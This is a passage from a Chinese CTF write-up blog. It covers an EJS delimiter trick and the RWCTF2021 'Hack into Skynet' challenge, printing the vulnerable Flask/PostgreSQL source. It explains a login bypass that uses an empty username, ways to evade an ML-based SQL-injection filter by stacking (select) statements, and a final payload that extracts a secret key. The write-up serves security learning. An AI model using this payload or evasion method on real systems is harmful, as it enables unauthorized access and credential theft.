<pre class=" language-javascript"><code class="language-javascript"><span class="token operator">></span>ejs<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"&lt;%= 12345 %>flaggggg"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"delimiter"</span><span class="token punctuation">:</span><span class="token string">"%= 12345 %>"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">741</span> Uncaught Error<span class="token punctuation">:</span> Could not find matching close tag <span class="token keyword">for</span> <span class="token string">"&lt;%= 12345 %>"</span><span class="token punctuation">.</span>
    at ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">741</span>
    at Array<span class="token punctuation">.</span>forEach <span class="token punctuation">(</span><span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">)</span>
    at Template<span class="token punctuation">.</span>generateSource <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">731</span><span class="token punctuation">)</span>
    at Template<span class="token punctuation">.</span>compile <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">586</span><span class="token punctuation">)</span>
    at Object<span class="token punctuation">.</span>compile <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">397</span><span class="token punctuation">)</span>
    at handleCache <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">234</span><span class="token punctuation">)</span>
    at Object<span class="token punctuation">.</span>exports<span class="token punctuation">.</span>render <span class="token punctuation">(</span>ejs<span class="token punctuation">.</span>js<span class="token punctuation">:</span><span class="token number">424</span><span class="token punctuation">)</span>
    at <span class="token operator">&lt;</span>anonymous<span class="token operator">></span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">5</span>
<span class="token operator">></span>ejs<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"&lt;%= 12345 %>flaggggg"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token string">"delimiter"</span><span class="token punctuation">:</span><span class="token string">"%= 12345 %>a"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token string">'&lt;%= 12345 %>flaggggg'</span>
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>全是在学nginx语法。。<br><a href="https://segmentfault.com/a/1190000022499679">Nginx 的基础内置变量 &#x2F; Nginx 重写 url 的模式</a><br><a href="https://segmentfault.com/a/1190000022315733">一文理清 nginx 中的 location 配置</a><br><a href="https://www.nginx.com/resources/wiki/start/topics/examples/phpfcgi/">PHP FastCGI Example</a><br><a href="https://0xgeekcat.github.io/Node-js%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-GYCTF2020-Node-Game.html">Node.js漏洞学习-GYCTF2020 Node Game</a><br><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/">register_argc_argv与include限制php任意文件下载的小结</a><br><a href="https://igml.top/2021/09/13/2021-RCTF/">gml神仙的wp</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>php</tag>
        <tag>SQLI</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>[RWCTF2021]wp</title>
    <url>/%5BRWCTF2021%5Dwp.html</url>
    <content><![CDATA[<h1 id="RWCTF2021-wp"><a href="#RWCTF2021-wp" class="headerlink" title="[RWCTF2021]wp"></a>[RWCTF2021]wp</h1><p>好像也一个题不会来着，其实算是个复现吧。。。<br>以及寒假+过年摸了好久的鱼。。。</p>
<h2 id="Hack-into-Skynet"><a href="#Hack-into-Skynet" class="headerlink" title="Hack into Skynet"></a>Hack into Skynet</h2><p>最多解的web，是一个加了一个迷之AI的pgsql注入</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span>

<span class="token keyword">import</span> flask
<span class="token keyword">import</span> psycopg2
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> skynet <span class="token keyword">import</span> Skynet

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> static_url_path<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
skynet <span class="token operator">=</span> Skynet<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">skynet_detect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    req <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'method'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method<span class="token punctuation">,</span>
        <span class="token string">'path'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>full_path<span class="token punctuation">,</span>
        <span class="token string">'host'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'host'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'content_type'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'useragent'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user-agent'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'referer'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'referer'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'cookie'</span><span class="token punctuation">:</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cookie'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'body'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>get_data<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    _<span class="token punctuation">,</span> result <span class="token operator">=</span> skynet<span class="token punctuation">.</span>classify<span class="token punctuation">(</span>req<span class="token punctuation">)</span>
    <span class="token keyword">return</span> result <span class="token operator">and</span> result<span class="token punctuation">[</span><span class="token string">'attack'</span><span class="token punctuation">]</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/static/&lt;path:path>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">static_files</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_from_directory<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">do_query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> skynet_detect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token operator">not</span> query_login_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        response <span class="token operator">=</span> flask<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span><span class="token string">'No login, redirecting'</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span>
        response<span class="token punctuation">.</span>location <span class="token operator">=</span> flask<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> response

    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_from_directory<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        kt <span class="token operator">=</span> query_kill_time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> kt<span class="token punctuation">:</span>
            result <span class="token operator">=</span> kt 
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">do_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> skynet_detect<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_from_directory<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> <span class="token string">'login.html'</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> query_login_attempt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> flask<span class="token punctuation">.</span>send_from_directory<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">,</span> <span class="token string">'login.html'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            session <span class="token operator">=</span> create_session<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> flask<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span><span class="token string">'Login success'</span><span class="token punctuation">,</span> <span class="token number">302</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'SessionId'</span><span class="token punctuation">,</span> session<span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>location <span class="token operator">=</span> flask<span class="token punctuation">.</span>escape<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> response
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> flask<span class="token punctuation">.</span>abort<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">query_login_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sid <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'SessionId'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> sid<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    now <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
            host<span class="token operator">=</span><span class="token string">"challenge-db"</span><span class="token punctuation">,</span>
            database<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">,</span>
            user<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">,</span>
            password<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
        cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
        cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT sessionid"</span>
           <span class="token string">"  FROM login_session"</span>
           <span class="token string">"  WHERE sessionid = %s"</span>
           <span class="token string">"    AND valid_since &lt;= %s"</span>
           <span class="token string">"    AND valid_until >= %s"</span>
           <span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>sid<span class="token punctuation">,</span> now<span class="token punctuation">,</span> now<span class="token punctuation">)</span><span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">[</span>r <span class="token keyword">for</span> r <span class="token keyword">in</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> bool<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">query_login_attempt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    username <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> username <span class="token operator">and</span> <span class="token operator">not</span> password<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"SELECT id, account"</span>
           <span class="token string">"  FROM target_credentials"</span>
           <span class="token string">"  WHERE password = '{}'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> sql_exec<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
    name <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> user <span class="token operator">and</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">and</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">else</span> <span class="token string">''</span>
    <span class="token keyword">return</span> name <span class="token operator">==</span> username

<span class="token keyword">def</span> <span class="token function">create_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    valid_since <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span>
    valid_until <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> datetime<span class="token punctuation">.</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    sessionid <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>valid_since<span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>valid_until<span class="token punctuation">)</span><span class="token operator">+</span>str<span class="token punctuation">(</span>datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

    sql_exec_update<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"INSERT INTO login_session (sessionid, valid_since, valid_until)"</span>
           <span class="token string">"  VALUES ('{}', '{}', '{}')"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>sessionid<span class="token punctuation">,</span> valid_since<span class="token punctuation">,</span> valid_until<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> sessionid

<span class="token keyword">def</span> <span class="token function">query_kill_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> name<span class="token punctuation">:</span>
        <span class="token keyword">return</span> None

    sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"SELECT name, born"</span>
           <span class="token string">"  FROM target"</span>
           <span class="token string">"  WHERE age > 0"</span>
           <span class="token string">"    AND name = '{}'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    nb <span class="token operator">=</span> sql_exec<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> nb<span class="token punctuation">:</span>
        <span class="token keyword">return</span> None
    <span class="token keyword">return</span> <span class="token string">'{}: {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token operator">*</span>nb<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">sql_exec</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
                host<span class="token operator">=</span><span class="token string">"challenge-db"</span><span class="token punctuation">,</span>
                database<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">,</span>
                user<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">,</span>
                password<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
            cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>stmt<span class="token punctuation">)</span>
            <span class="token keyword">for</span> row <span class="token keyword">in</span> cursor<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>col <span class="token keyword">for</span> col <span class="token keyword">in</span> row<span class="token punctuation">]</span><span class="token punctuation">)</span>
            cursor<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token keyword">def</span> <span class="token function">sql_exec_update</span><span class="token punctuation">(</span>stmt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> psycopg2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>
                host<span class="token operator">=</span><span class="token string">"challenge-db"</span><span class="token punctuation">,</span>
                database<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">,</span>
                user<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">,</span>
                password<span class="token operator">=</span><span class="token string">"ctf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
            cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
            cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>stmt<span class="token punctuation">)</span>
            conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">return</span> data

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>
</code></pre>
<p>功能就是登录然后能进行一个查询，在查询那里有一个注入点</p>
<p>赛时以为query_login_state能注入的，这样子就能直接登录，日了半天本地也能跑通远程就是不通。。。当时还以为是不是根本不存在其他人登陆成功的token在里面</p>
<pre class=" language-python"><code class="language-python">cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT sessionid"</span>
           <span class="token string">"  FROM login_session"</span>
           <span class="token string">"  WHERE sessionid = %s"</span>
           <span class="token string">"    AND valid_since &lt;= %s"</span>
           <span class="token string">"    AND valid_until >= %s"</span>
           <span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>sid<span class="token punctuation">,</span> now<span class="token punctuation">,</span> now<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre>
<p>赛后才发现这里和其他地方不一样，execute直接传了第二个参数，然后去翻了一下官方文档，这样子操作就是类似预处理的操作了，无法注入。<br><a href="https://www.psycopg.org/docs/usage.html#query-parameters">https://www.psycopg.org/docs/usage.html#query-parameters</a></p>
<p>但其余的语句都是先进行字符串拼接然后再整个传入execute的。但是create_session处三个参数均不可控，query_login_attempt处也不可控，综合看下来只有登录进去之后的query_kill_time是一个完全可控的注入点</p>
<h3 id="绕过登录"><a href="#绕过登录" class="headerlink" title="绕过登录"></a>绕过登录</h3><p>登录那里不能注入就只能看看有没有其他的逻辑漏洞了，然后发现登录校验处写了垃圾代码。</p>
<pre class=" language-python"><code class="language-python">    username <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> flask<span class="token punctuation">.</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> username <span class="token operator">and</span> <span class="token operator">not</span> password<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

    sql <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"SELECT id, account"</span>
           <span class="token string">"  FROM target_credentials"</span>
           <span class="token string">"  WHERE password = '{}'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    user <span class="token operator">=</span> sql_exec<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>
    name <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> user <span class="token operator">and</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">and</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">else</span> <span class="token string">''</span>
    <span class="token keyword">return</span> name <span class="token operator">==</span> username
</code></pre>
<p>这里写了一句if not username and not password，也就是用户名密码均为空才会退出，而查询则是先查密码然后对比用户名，并且查不出来的时候用户名还是空字符串，那么只要随便输入一个密码，必定查不出来，用户名留空，两个空字符串对比相等，就能绕过登录校验。</p>
<h3 id="注入环节"><a href="#注入环节" class="headerlink" title="注入环节"></a>注入环节</h3><p>说实话我最烦SQL注入了。。。猛男落泪.jpg<br>pgsql不是很熟，直接上本地环境进行测试。这个注入并没有什么传统的关键字过滤，只有一个写在一开始的迷之Skynet进行检测（这个数据的传输格式+返回值的类型，一看就知道是个人工智能）。简单的测了一下就发现确实是这样子，经常会出现一个payload没有被ban，加上两个其他字符就挂了，然后去掉其他语句之后这个其他字符存在也能通过。。。</p>
<p>先就地注了一下当前表，没有有效数据（这个时候如果我直接改一个union select注入可能早就给他秒了。。。。）然后我究极不熟悉pgsql语法，居然愚蠢的想去进行盲注。。。明明这个题给了回显的来着。。。然后把上古套娃pgsql盲注语句翻出来之后，发现最后的引号闭合不起来。。。加上注释符就被waf，去掉注释符就没事。然后我开始乱测，希望通过其他的干扰字符来扰乱AI的判断。具体尝试有：添加大量的垃圾数据，在header各个接受输入的字段输入各种奇怪的字符，尝试是否存在类似于白名单之类的关键词，或者多塞几个引号和在内联注释里面塞一堆乱七八糟的字符。pgsql通过单引号来转义单引号，但如果在字符串的开头加一个大写E，就能用反斜杠来转义单引号，使用这种操作等等。均失败。。。太垃圾了</p>
<p>最后发现了一个绝对绕过方案，就是加括号？添加一定数量的括号对就能使任意复杂的payload通过，但这个括号在内联注释和字符串中都不行，就是得成为一个单独的语句。。。再次麻了，又试了一遍各种转义试图打断AI对字符串和注释的范围界定，失败。呜呜呜</p>
<p>最后是无敌的老国王试了下发现execute默认能执行多语句。并且pgsql能直接<code>select;</code>，这样子直接返回一个空的行，连续多个select;后接有效的查询语句之前的空行就都会被忽略。<br>以及老国王提到绕过AI用我之前那种引号注释乱塞的方法不一定能通过，他的思路就是我提到括号多起来之后就能bypass，所以尽可能的增多AI能够通过的内容，就可能被判别为安全</p>
<p>这样子就能任意注入自由翱翔了，并且支持多语句之后也可以令原本的查询语句结果为空，然后执行一个任意的查询<br>最后的payload为<code>&#39;;(select);(select);(select);(select);(select);select 1,secret_key from target_credentials limit 1 offset 0;--</code><br>实际上根本不需要这么麻烦，好像这个AI对注释符–的检测比较严格，但只要能直接闭合引号，就能随便过检测，所以直接union就好了，或者堆叠然后select。。。最后写一个<code>offset &#39;0</code>来闭合即可</p>
<p>这里在查表名的时候还踩了一些乱七八糟的坑。pgsql有一套自己的数据库结构体系，但同时又实现了information_schema这个SQL标准。导致我一时竟不知道查谁。information_schema就和常用的一样，但pgsql专用表函数得看看官方文档<br><a href="https://www.postgresql.org/docs/9.3/monitoring-stats.html">https://www.postgresql.org/docs/9.3/monitoring-stats.html</a><br>pg_stat_all_tables查所有表名，pg_stat_user_tables可以省掉一些不必要的，只有当前用户的表，但是查列名好像还是得用information_schema</p>
